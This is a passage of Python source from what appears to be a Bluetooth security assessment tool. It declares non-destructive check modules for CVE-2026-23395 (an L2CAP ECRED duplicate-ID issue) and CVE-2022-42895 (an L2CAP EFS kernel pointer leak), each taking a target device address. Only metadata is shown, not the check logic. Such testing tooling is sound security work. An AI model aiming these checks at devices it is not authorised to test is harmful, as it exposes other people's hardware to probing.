    protocols = ("BLE", "L2CAP")
    requires = ("ble_target",)
    destructive = False
    references = ("CVE-2026-23395",)
    options = (OptAddress("RHOST", required=True, description="Target BLE address"),)

    check_fn = staticmethod(_check_ecred_duplicate_id)
    option_param_map = {"RHOST": "address"}


class Cve202242895Module(CveCheckModule):
    """CVE-2022-42895: L2CAP EFS option kernel pointer leak."""

    module_id = "assessment.cve_2022_42895"
    name = "L2CAP EFS Info Leak"
    description = "CVE-2022-42895: L2CAP EFS option leaks kernel pointer in CONF_RSP"
    protocols = ("Classic", "L2CAP")
    requires = ("classic_target",)
    destructive = False
    references = ("CVE-2022-42895",)
    options = (OptAddress("RHOST", required=True, description="Target BR/EDR address"),)

    check_fn = staticmethod(_check_l2cap_efs_info_leak)
    option_param_map = {"RHOST": "address"}
